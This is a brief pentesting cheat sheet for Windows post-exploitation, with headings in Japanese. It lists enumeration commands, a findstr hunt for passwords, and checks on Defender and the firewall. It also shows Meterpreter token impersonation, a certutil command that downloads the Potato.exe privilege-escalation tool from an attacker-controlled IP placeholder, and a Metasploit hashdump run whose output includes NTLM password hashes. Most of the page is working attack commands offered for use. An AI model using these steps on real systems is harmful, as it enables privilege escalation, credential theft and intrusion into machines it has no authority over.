# Windows

## 情報収集

```shell
systeminfo
```

```shell
whoami /priv
whoami /groups
```

```shell
net user
net user <user>
```

```shell
ipconfig
arp -a
route print
netstat -ano
```

```shell
findstr /si password *.txt
```

```shell
sc query
sc query windefend
```

```shell
netsh firewall show state
```

```shell
meterpreter> run post/multi/recon/local_exploit_suggester
```

```shell
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token <domain\username>
```

```shell
# wget と同じ効果
certutil -urlcache -f http://<ip>/Potato.exe Potato.exe
```

### hashdump

特権ユーザーのセッションが必要

```shell
msf6 post(windows/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/hashdump) > run

[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::
```
